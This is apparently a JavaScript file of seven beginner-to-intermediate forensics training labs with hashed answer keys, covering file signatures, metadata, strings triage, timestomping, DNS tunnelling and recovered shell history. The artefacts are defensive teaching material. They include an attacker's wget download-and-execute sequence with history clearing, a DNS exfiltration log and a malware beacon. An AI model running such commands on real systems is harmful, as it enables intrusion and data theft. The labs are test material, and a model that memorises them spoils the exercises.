/* HackGrid labs · Forensics (generated from _shared/tools/labs-src, do not edit the built copy) */
(function () {
const L = o => HR.defineLab(Object.assign({ env: { type: 'static', blocks: o.blocks || [] } }, o));

L({ id: 'for-01', cat: 'forensics', diff: 1, title: 'Not a PDF',
  brief: `A file called invoice.pdf will not open in any PDF reader. File names lie; the first bytes rarely do.`,
  blocks: [{ t: 'code', title: 'xxd invoice.pdf | head -2', text: '00000000: 8950 4e47 0d0a 1a0a 0000 000d 4948 4452  .PNG........IHDR\n00000010: 0000 0320 0000 0258 0806 0000 009a 7b3c  ... ...X......{<' }],
  q: 'What type of file is it really?', ph: 'file type',
  accept: ["8f8cbb7dcf46e0bc7d53265749a6c17d116093a6ba95e442764060c76fd4a86c", "bef1b24fabe0f23abe1e22dc3de3c27a1ac38c74ac964ba3d9592deb87e4a49b", "6057ef0f39de92dc160167499cb0c7a0a5bd73868b51dfbcdf333dcce3628a83", "bd1166c1251dedd290bd689f1a1ce4733e409b54115ba9556109b8672bc42bbe", "17d3c9bc7f7ed7a4926194a1741d1cd47850bb63e60557d770d062fcc89a6b53"],
  hints: [`The first few bytes of a file are its magic number.`, `A real PDF starts with %PDF.`, `Look at the ASCII column on the right.`],
  walk: `<span class="mono">89 50 4E 47 0D 0A 1A 0A</span> is the PNG signature (you can even read <span class="mono">.PNG</span>), and IHDR is the PNG header chunk. Useful signatures: <span class="mono">%PDF</span> PDF, <span class="mono">FF D8 FF</span> JPEG, <span class="mono">50 4B 03 04</span> ZIP (also docx/xlsx/apk), <span class="mono">4D 5A</span> Windows executable, <span class="mono">7F 45 4C 46</span> ELF. The <span class="mono">file</span> command does this lookup for you.` });

L({ id: 'for-02', cat: 'forensics', diff: 1, title: 'Holiday Photo',
  brief: `A user received holiday_photo.jpg by email and double-clicked it. Nothing appeared, but the antivirus woke up. Check the header.`,
  blocks: [{ t: 'code', title: 'xxd holiday_photo.jpg | head -3', text: '00000000: 4d5a 9000 0300 0000 0400 0000 ffff 0000  MZ..............\n00000010: b800 0000 0000 0000 4000 0000 0000 0000  ........@.......\n00000040: 0e1f ba0e 00b4 09cd 21b8 014c cd21 5468  ........!..L.!Th\n00000050: 6973 2070 726f 6772 616d 2063 616e 6e6f  is program canno' }],
  q: 'What kind of file is it really?', ph: 'file type',
  accept: ["9095bdb859308b62acf04036ffd4adfe366d7f737d276eb6c46ae434f3816c9b", "bdff922e713db93993ed3b1939d9f0a7113945d7ae1a388748ff4f2a217ced87", "a29c2123a01df1d0febb9d308a20d8a2fe3d40a91ca8b1294f59f08f9773ebea", "cdf69b25a417e25753dc086819d2cdfd3939f7d0e175136812e936284bebb4a4", "4d12f7645befa7ec75bc590376f19196753f18612d679bd64f2cb846ca0c81cd", "c4e695a190e52ae30ab18ce22077eadadd83a0507e81ce59100f7735d032c554", "ceed342be41f3db11de1268b37675261375fb1958085bb1130853d2a3629ea85", "47448469813f57d00fd321dc9a7741682c02b684b730af487918775fc7077648", "3ed0256da8da5eabae7aa1680886a2aa394dd7c002eb2f3b02e9f0f9ec9daa2c"],
  hints: [`A JPEG starts with FF D8 FF.`, `What do the two letters at offset 0 spell?`, `"This program cannot be run in DOS mode" is in every Windows program.`],
  walk: `<span class="mono">4D 5A</span> ("MZ") and the DOS stub message mean a <b>Windows executable</b> (PE file) renamed to .jpg. Windows decides how to open a file by extension, but mail filters and users judge by name, which is exactly why attackers rename executables.` });

L({ id: 'for-03', cat: 'forensics', diff: 2, title: 'The Photo Remembers',
  brief: `A leaked photo of a prototype appeared online. The legal team asks: does the file say who took it? Read the metadata.`,
  blocks: [{ t: 'code', title: 'exiftool prototype.jpg', text: 'File Name                       : prototype.jpg\nMake                            : Pixelmark\nCamera Model Name               : PX-9 Pro\nSoftware                        : PhotoTune 4.2\nDate/Time Original              : 2026:09:14 18:22:07\nArtist                          : j.morales\nCopyright                       : (c) Northwind Labs\nGPS Latitude                    : 52 deg 22\' 12.00" N\nGPS Longitude                   : 4 deg 53\' 42.00" E\nImage Size                      : 4032x3024' }],
  q: 'According to the metadata, who took the photo?', ph: 'name',
  accept: ["9795d1befd2dddb21745561557f71bd38a83157b820139c5a486190e0f671607", "0fe9131c7e1e83ea5d2ad45632a45481dfe1b11e9ff5a7e14ea6dd94640286f1", "081bbb21da2eb9dcc8052884f7724c011eec43a233c7e03a420473841f456437"],
  hints: [`exiftool lists every metadata tag in the file.`, `Camera owners often set their name in the camera settings.`, `Look at the Artist tag.`],
  walk: `The <span class="mono">Artist</span> tag says <b>j.morales</b>, and GPS coordinates give the location too. Metadata is a goldmine in investigations and a privacy risk for everyone else: many sites strip it on upload, but files shared directly (email, chat attachments, documents) usually keep it. Strip it with <span class="mono">exiftool -all= file.jpg</span>.` });

L({ id: 'for-04', cat: 'forensics', diff: 2, title: 'Strings Attached',
  brief: `A suspicious binary was found on a laptop. Before any deep analysis, an analyst runs strings to see readable text inside it. Which domain does it phone home to?`,
  blocks: [{ t: 'code', title: 'strings -n 6 svc_update.bin | head -20', text: '/lib64/ld-linux-x86-64.so.2\nlibc.so.6\nGLIBC_2.34\nUsage: %s [-q]\nUser-Agent: Mozilla/5.0 (compatible)\nPOST /api/v1/beacon HTTP/1.1\nHost: update-check.cdn-sync.example\ninterval=300\n/etc/hostname\n/tmp/.cache_lock\nhttps://docs.python.org/3/\n%s|%s|%d\nsleep failed' }],
  q: 'Which hostname does the binary contact?', ph: 'hostname',
  accept: ["c716eab3a53079e766a4bd3b8f2b41e694596131e6a70a071b6982928aeeab84", "963d2d2a8697a0ef98bf05d19b43acad9c9b6370e2e79c8497412cf44a2842d7"],
  hints: [`Look for something that builds an HTTP request.`, `A Host header tells you where the request goes.`, `The docs.python.org string is just noise from a library.`],
  walk: `The binary builds <span class="mono">POST /api/v1/beacon</span> with <span class="mono">Host: <b>update-check.cdn-sync.example</b></span> and an <span class="mono">interval=300</span>: a check-in every 5 minutes. strings is the fastest triage tool there is: it often reveals domains, paths, user agents and file names in seconds. Those become indicators of compromise to search for across the network.` });

L({ id: 'for-05', cat: 'forensics', diff: 3, title: 'Back to the Future',
  brief: `An attacker dropped a tool on a server and changed its timestamps so it would blend in with old files (timestomping). But they only changed one of the timestamps. Which file was tampered with?`,
  blocks: [{ t: 'table', title: 'stat summary of /usr/local/bin', cols: ['File', 'Birth (created)', 'Modified'],
    rows: [['backup.sh', '2024-02-11 09:14', '2025-06-02 16:40'], ['rotate-logs.sh', '2024-02-11 09:15', '2024-02-11 09:15'], ['netcheck', '2026-11-04 23:44', '2023-01-17 10:02'], ['deploy-hook', '2025-08-19 12:00', '2026-10-30 08:12']] }],
  q: 'Which file has impossible timestamps?', ph: 'file name',
  accept: ["5eed1b027797b5c1b3f7f371b94ff83f0ecbb7fb8686e133eb62fa5bdd12e6b5", "b41ee304b69d0bfca9dda0bc333f18c53702593158ea05bdbc0b89483638e5cd"],
  hints: [`A file cannot be modified before it exists.`, `Compare Birth and Modified on each row.`, `One file was created during the incident night.`],
  walk: `<b>netcheck</b> was born on 2026-11-04 at 23:44 (the incident window) but claims to be modified in 2023. Modification before creation is impossible, so the Modified time was forged. Tools like <span class="mono">touch -d</span> set modified and access times easily, but the birth/change times are much harder to fake, which is why investigators compare all of them.` });

L({ id: 'for-06', cat: 'forensics', diff: 3, title: 'Data in the Names',
  brief: `DNS is allowed almost everywhere, so attackers sometimes smuggle data inside DNS queries. The resolver logs show strange subdomains of one domain. The first label of the first query is base64. What file name does it spell?`,
  blocks: [{ t: 'code', title: 'dns-queries.log', text: '03:40:01 FIN-PC-07 A  aHJfcGF5cm9sbC54bHN4.0.t.metrics-cdn.example\n03:40:01 FIN-PC-07 A  UEsDBBQABgAIAAAAIQ.1.t.metrics-cdn.example\n03:40:02 FIN-PC-07 A  DfpVaXcQEAAJcFAAAT.2.t.metrics-cdn.example\n03:40:02 FIN-PC-07 A  www.example.com\n03:40:02 FIN-PC-07 A  AAgCW0NvbnRlbnRfVH.3.t.metrics-cdn.example' }],
  q: 'Which file was being exfiltrated? (decode the first label)', ph: 'file name',
  accept: ["de2cfd29b329b2af2778a99ee6cc7ad681a2253baddde2a8ecb9375478d3ec83"],
  hints: [`The domain is the same each time; only the first labels change, with a sequence number.`, `Copy the first label and base64-decode it (SecLab's Decoder does this).`, `The following chunks start with UEsDB: base64 for PK, the start of a ZIP/XLSX file.`],
  walk: `The first label decodes to <b>hr_payroll.xlsx</b>, and the next chunks start with <span class="mono">UEsDB</span> (base64 of <span class="mono">PK\\x03\\x04</span>, the header of a ZIP-based Office file). Long random-looking labels, numbered sequences and one unusual parent domain are classic DNS tunneling indicators. Block the domain and inspect FIN-PC-07.` });

L({ id: 'for-07', cat: 'forensics', diff: 2, title: 'They Forgot the History',
  brief: `The attacker ran history -c to clear their tracks, but the shell had already written .bash_history to disk. What was the full path of the tool they dropped and ran?`,
  blocks: [{ t: 'code', title: '/home/deploy/.bash_history', text: 'id\nuname -a\ncd /tmp\nwget http://198.51.100.9/k -O /tmp/.x\nchmod +x /tmp/.x\n/tmp/.x -d &\nls -la /tmp\nhistory -c\nrm -f /tmp/.x' }],
  q: 'Full path of the dropped tool?', ph: '/path',
  accept: ["dae31c5e5761eb55ba8b2cfb45232c8c9d7a2ad02a10d63a2294106767bb887c"],
  hints: [`Follow the download, the chmod and the execution.`, `-O sets the output file of wget.`, `Hidden files on Linux start with a dot.`],
  walk: `<span class="mono">wget ... -O <b>/tmp/.x</b></span>, <span class="mono">chmod +x</span>, run in the background, then <span class="mono">history -c</span> and <span class="mono">rm</span>. history -c only clears the in-memory list of that session; anything already saved stays in the file. The file was deleted, but the process may still be running: <span class="mono">ls -l /proc/*/exe 2>/dev/null | grep deleted</span> finds it.` });
})();
